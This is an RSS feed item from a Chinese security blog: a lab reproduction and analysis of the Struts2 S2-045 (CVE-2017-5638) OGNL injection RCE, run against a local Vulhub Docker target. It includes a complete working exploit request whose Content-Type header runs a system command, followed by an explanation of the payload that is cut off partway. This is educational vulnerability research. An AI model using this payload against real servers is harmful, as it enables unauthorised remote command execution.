<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>bae的博客 • Posts by &#34;rce&#34; tag</title>
        <link>https://bae-ace.github.io</link>
        <description>bae的个人博客</description>
        <language>zh-CN</language>
        <pubDate>Thu, 24 Jul 2025 08:10:34 +0800</pubDate>
        <lastBuildDate>Thu, 24 Jul 2025 08:10:34 +0800</lastBuildDate>
        <category>工具</category>
        <category>sqlmap</category>
        <category>渗透测试</category>
        <category>PWN</category>
        <category>ELF</category>
        <category>ROP</category>
        <category>CTF</category>
        <category>二进制安全</category>
        <category>Web安全</category>
        <category>SQL注入</category>
        <category>网络安全</category>
        <category>hexo</category>
        <category>博客搭建</category>
        <category>初始测试</category>
        <category>Struts2</category>
        <category>RCE</category>
        <category>漏洞复现</category>
        <category>OGNL注入</category>
        <category>linux</category>
        <category>命令</category>
        <category>命令执行</category>
        <category>漏洞利用</category>
        <category>信息收集</category>
        <category>子域名</category>
        <item>
            <guid isPermalink="true">https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/</guid>
            <title>Struts2-045远程代码执行漏洞复现与原理分析</title>
            <link>https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/</link>
            <category>Web安全</category>
            <category>Struts2</category>
            <category>RCE</category>
            <category>漏洞复现</category>
            <category>OGNL注入</category>
            <pubDate>Thu, 24 Jul 2025 08:10:34 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;Struts2-045远程代码执行漏洞复现与原理分析&#34;&gt;&lt;a href=&#34;#Struts2-045远程代码执行漏洞复现与原理分析&#34; class=&#34;headerlink&#34; title=&#34;Struts2-045远程代码执行漏洞复现与原理分析&#34;&gt;&lt;/a&gt;Struts2-045远程代码执行漏洞复现与原理分析&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;&lt;a href=&#34;#漏洞概述&#34; class=&#34;headerlink&#34; title=&#34;漏洞概述&#34;&gt;&lt;/a&gt;漏洞概述&lt;/h2&gt;&lt;p&gt;Struts2-045（CVE-2017-5638）是Apache Struts2框架中的一个严重远程代码执行漏洞，该漏洞因其影响范围广、利用简单而备受关注。攻击者可以通过构造恶意的Content-Type请求头，在目标服务器上执行任意系统命令。&lt;/p&gt;
&lt;h2 id=&#34;漏洞基本信息&#34;&gt;&lt;a href=&#34;#漏洞基本信息&#34; class=&#34;headerlink&#34; title=&#34;漏洞基本信息&#34;&gt;&lt;/a&gt;漏洞基本信息&lt;/h2&gt;&lt;h3 id=&#34;影响版本&#34;&gt;&lt;a href=&#34;#影响版本&#34; class=&#34;headerlink&#34; title=&#34;影响版本&#34;&gt;&lt;/a&gt;影响版本&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Apache Struts 2.3.5 - 2.3.31&lt;/strong&gt;（包含2.3.31版本）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Apache Struts 2.5.0 - 2.5.10&lt;/strong&gt;（包含2.5.10版本）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;漏洞等级&#34;&gt;&lt;a href=&#34;#漏洞等级&#34; class=&#34;headerlink&#34; title=&#34;漏洞等级&#34;&gt;&lt;/a&gt;漏洞等级&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVSS评分&lt;/strong&gt;: 10.0（严重）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;: 远程代码执行（RCE）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;攻击复杂度&lt;/strong&gt;: 低&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;核心原理&#34;&gt;&lt;a href=&#34;#核心原理&#34; class=&#34;headerlink&#34; title=&#34;核心原理&#34;&gt;&lt;/a&gt;核心原理&lt;/h3&gt;&lt;p&gt;Struts2框架在处理文件上传请求时，会解析Content-Type请求头。当Content-Type格式不正确时，框架会抛出异常，而&lt;strong&gt;异常处理过程中会对错误信息进行OGNL表达式解析&lt;/strong&gt;，这就给了攻击者可乘之机。&lt;/p&gt;
&lt;h2 id=&#34;技术原理深度分析&#34;&gt;&lt;a href=&#34;#技术原理深度分析&#34; class=&#34;headerlink&#34; title=&#34;技术原理深度分析&#34;&gt;&lt;/a&gt;技术原理深度分析&lt;/h2&gt;&lt;h3 id=&#34;OGNL表达式注入机制&#34;&gt;&lt;a href=&#34;#OGNL表达式注入机制&#34; class=&#34;headerlink&#34; title=&#34;OGNL表达式注入机制&#34;&gt;&lt;/a&gt;OGNL表达式注入机制&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;OGNL（Object-Graph Navigation Language）&lt;/strong&gt; 是Struts2框架使用的表达式语言，用于在Java对象之间进行导航和操作。&lt;/p&gt;
&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// OGNL表达式示例&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-selector-id&#34;&gt;#context&lt;/span&gt;&lt;span class=&#34;hljs-selector-attr&#34;&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;xwork.MethodAccessor.denyMethodExecution&amp;#x27;&lt;/span&gt;]&lt;/span&gt; = false&lt;br&gt;@java&lt;span class=&#34;hljs-selector-class&#34;&gt;.lang&lt;/span&gt;.Runtime@&lt;span class=&#34;hljs-built_in&#34;&gt;getRuntime&lt;/span&gt;()&lt;span class=&#34;hljs-selector-class&#34;&gt;.exec&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;漏洞触发流程&#34;&gt;&lt;a href=&#34;#漏洞触发流程&#34; class=&#34;headerlink&#34; title=&#34;漏洞触发流程&#34;&gt;&lt;/a&gt;漏洞触发流程&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;请求接收&lt;/strong&gt;: 服务器接收包含恶意Content-Type的HTTP请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;类型解析&lt;/strong&gt;: Struts2尝试解析Content-Type头部信息&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;异常触发&lt;/strong&gt;: 恶意构造的Content-Type导致解析异常&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;错误处理&lt;/strong&gt;: 异常处理器对错误信息进行OGNL解析&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;代码执行&lt;/strong&gt;: 恶意OGNL表达式被执行，实现RCE&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;关键源码分析&#34;&gt;&lt;a href=&#34;#关键源码分析&#34; class=&#34;headerlink&#34; title=&#34;关键源码分析&#34;&gt;&lt;/a&gt;关键源码分析&lt;/h3&gt;&lt;p&gt;漏洞位于&lt;code&gt;org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest&lt;/code&gt;类中：&lt;/p&gt;
&lt;figure class=&#34;highlight typescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs typescript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 简化的漏洞代码逻辑&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;buildErrorMessage&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-title class_&#34;&gt;Throwable&lt;/span&gt; e, &lt;span class=&#34;hljs-title class_&#34;&gt;Object&lt;/span&gt;[] args&lt;/span&gt;) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-title class_&#34;&gt;String&lt;/span&gt; errorMessage = localizedTextProvider.&lt;span class=&#34;hljs-title function_&#34;&gt;findDefaultText&lt;/span&gt;(e.&lt;span class=&#34;hljs-title function_&#34;&gt;getMessage&lt;/span&gt;(), locale, args);&lt;br&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// 这里会对errorMessage进行OGNL表达式解析，导致RCE&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (errorMessage != &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;        errorMessage = &lt;span class=&#34;hljs-title class_&#34;&gt;TextParseUtil&lt;/span&gt;.&lt;span class=&#34;hljs-title function_&#34;&gt;translateVariables&lt;/span&gt;(errorMessage, stack);&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;实验环境搭建&#34;&gt;&lt;a href=&#34;#实验环境搭建&#34; class=&#34;headerlink&#34; title=&#34;实验环境搭建&#34;&gt;&lt;/a&gt;实验环境搭建&lt;/h2&gt;&lt;h3 id=&#34;系统架构&#34;&gt;&lt;a href=&#34;#系统架构&#34; class=&#34;headerlink&#34; title=&#34;系统架构&#34;&gt;&lt;/a&gt;系统架构&lt;/h3&gt;&lt;figure class=&#34;highlight nix&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs nix&#34;&gt;┌─ 攻击机（Host）&lt;br&gt;│  └─ Windows&lt;span class=&#34;hljs-symbol&#34;&gt;/Linux&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;+&lt;/span&gt; BurpSuite&lt;br&gt;│&lt;br&gt;└─ 靶机（Kali VM）&lt;br&gt;   ├─ &lt;span class=&#34;hljs-params&#34;&gt;IP:&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;56.102&lt;/span&gt;&lt;br&gt;   ├─ Docker &lt;span class=&#34;hljs-operator&#34;&gt;+&lt;/span&gt; Vulhub&lt;br&gt;   └─ Struts2 App (Port &lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;Docker环境部署&#34;&gt;&lt;a href=&#34;#Docker环境部署&#34; class=&#34;headerlink&#34; title=&#34;Docker环境部署&#34;&gt;&lt;/a&gt;Docker环境部署&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 1. 克隆Vulhub项目&lt;/span&gt;&lt;br&gt;git &lt;span class=&#34;hljs-built_in&#34;&gt;clone&lt;/span&gt; https://github.com/vulhub/vulhub.git&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 2. 进入S2-045目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; vulhub/struts2/s2-045&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 3. 启动靶场&lt;/span&gt;&lt;br&gt;docker-compose up -d&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 4. 验证容器状态&lt;/span&gt;&lt;br&gt;docker ps -a&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;预期输出&lt;/strong&gt;:&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;CONTAINER&lt;/span&gt; ID   IMAGE                   COMMAND       CREATED     STATUS      PORTS                    NAMES&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;2363a15cda30&lt;/span&gt;   vulhub/struts2:&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt;   &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;mvn-server&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;min ago   Up &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;min     &lt;span class=&#34;hljs-number&#34;&gt;0.0.0.0:8080&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt;/tcp  s2-&lt;span class=&#34;hljs-number&#34;&gt;045&lt;/span&gt;-struts2-&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;环境验证&#34;&gt;&lt;a href=&#34;#环境验证&#34; class=&#34;headerlink&#34; title=&#34;环境验证&#34;&gt;&lt;/a&gt;环境验证&lt;/h3&gt;&lt;p&gt;访问 &lt;code&gt;http://192.168.56.102:8080/&lt;/code&gt; 应该能看到Struts2默认页面。&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用实战&#34;&gt;&lt;a href=&#34;#漏洞利用实战&#34; class=&#34;headerlink&#34; title=&#34;漏洞利用实战&#34;&gt;&lt;/a&gt;漏洞利用实战&lt;/h2&gt;&lt;h3 id=&#34;Payload构造原理&#34;&gt;&lt;a href=&#34;#Payload构造原理&#34; class=&#34;headerlink&#34; title=&#34;Payload构造原理&#34;&gt;&lt;/a&gt;Payload构造原理&lt;/h3&gt;&lt;p&gt;恶意Content-Type的核心结构：&lt;/p&gt;
&lt;figure class=&#34;highlight css&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content&lt;/span&gt;-Type: %&amp;#123;OGNL_EXPRESSION&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;完整攻击载荷&#34;&gt;&lt;a href=&#34;#完整攻击载荷&#34; class=&#34;headerlink&#34; title=&#34;完整攻击载荷&#34;&gt;&lt;/a&gt;完整攻击载荷&lt;/h3&gt;&lt;figure class=&#34;highlight smalltalk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs smalltalk&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;GET&lt;/span&gt; / &lt;span class=&#34;hljs-type&#34;&gt;HTTP&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Host&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.56&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.102&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;User&lt;/span&gt;-&lt;span class=&#34;hljs-type&#34;&gt;Agent&lt;/span&gt;: &lt;span class=&#34;hljs-type&#34;&gt;Mozilla&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;5.0&lt;/span&gt; (compatible; &lt;span class=&#34;hljs-type&#34;&gt;MSIE&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;9.0&lt;/span&gt;; &lt;span class=&#34;hljs-type&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;NT&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;6.1&lt;/span&gt;; &lt;span class=&#34;hljs-type&#34;&gt;Win64&lt;/span&gt;; x64)&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Accept&lt;/span&gt;: text/html,application/xhtml+xml,application/xml;q=&lt;span class=&#34;hljs-number&#34;&gt;0.9&lt;/span&gt;,*/*;q=&lt;span class=&#34;hljs-number&#34;&gt;0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Connection&lt;/span&gt;: close&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Content&lt;/span&gt;-&lt;span class=&#34;hljs-type&#34;&gt;Type&lt;/span&gt;: %&amp;#123;&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#nike&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;multipart/form-data&amp;#x27;&lt;/span&gt;).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#dm&lt;/span&gt;=@ognl.&lt;span class=&#34;hljs-type&#34;&gt;OgnlContext&lt;/span&gt;@&lt;span class=&#34;hljs-type&#34;&gt;DEFAULT_MEMBER_ACCESS&lt;/span&gt;).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#_memberAccess&lt;/span&gt;?(&lt;span class=&#34;hljs-symbol&#34;&gt;#_memberAccess&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#dm&lt;/span&gt;):(&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#container&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#context&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;com.opensymphony.xwork2.ActionContext.container&amp;#x27;&lt;/span&gt;]).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#ognlUtil&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#container&lt;/span&gt;.getInstance(@com.opensymphony.xwork2.ognl.&lt;span class=&#34;hljs-type&#34;&gt;OgnlUtil&lt;/span&gt;@class)).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedPackageNames().clear()).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedClasses().clear()).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#context&lt;/span&gt;.setMemberAccess(&lt;span class=&#34;hljs-symbol&#34;&gt;#dm&lt;/span&gt;))&lt;br&gt;    )).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#cmd&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#iswin&lt;/span&gt;=(@java.lang.&lt;span class=&#34;hljs-type&#34;&gt;System&lt;/span&gt;@getProperty(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;os.name&amp;#x27;&lt;/span&gt;).toLowerCase().contains(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;win&amp;#x27;&lt;/span&gt;))).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#cmds&lt;/span&gt;=(&lt;span class=&#34;hljs-symbol&#34;&gt;#iswin&lt;/span&gt;?&amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd.exe&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/c&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-symbol&#34;&gt;#cmd&lt;/span&gt;&amp;#125;:&amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/bin/bash&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;-c&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-symbol&#34;&gt;#cmd&lt;/span&gt;&amp;#125;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#p&lt;/span&gt;=new java.lang.&lt;span class=&#34;hljs-type&#34;&gt;ProcessBuilder&lt;/span&gt;(&lt;span class=&#34;hljs-symbol&#34;&gt;#cmds&lt;/span&gt;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#p&lt;/span&gt;.redirectErrorStream(&lt;span class=&#34;hljs-keyword&#34;&gt;true&lt;/span&gt;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#process&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#p&lt;/span&gt;.start()).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#ros&lt;/span&gt;=(@org.apache.struts2.&lt;span class=&#34;hljs-type&#34;&gt;ServletActionContext&lt;/span&gt;@getResponse().getOutputStream())).&lt;br&gt;    (@org.apache.commons.io.&lt;span class=&#34;hljs-type&#34;&gt;IOUtils&lt;/span&gt;@copy(&lt;span class=&#34;hljs-symbol&#34;&gt;#process&lt;/span&gt;.getInputStream(),&lt;span class=&#34;hljs-symbol&#34;&gt;#ros&lt;/span&gt;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#ros&lt;/span&gt;.flush())&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Content&lt;/span&gt;-&lt;span class=&#34;hljs-type&#34;&gt;Length&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;Payload逐行解析&#34;&gt;&lt;a href=&#34;#Payload逐行解析&#34; class=&#34;headerlink&#34; title=&#34;Payload逐行解析&#34;&gt;&lt;/a&gt;Payload逐行解析&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;表达式片段&lt;/th&gt;
&lt;th&gt;功能说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#nike=&amp;#39;multipart/form-data&amp;#39;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;设置伪装的Content-Type&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;获取默认成员访问权限&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#_memberAccess=#dm&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;绕过Struts2的安全限制&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#container=#context[...]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;获取ActionContext容器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#ognlUtil.getExcludedPackageNames().clear()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;清除包名黑名单&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
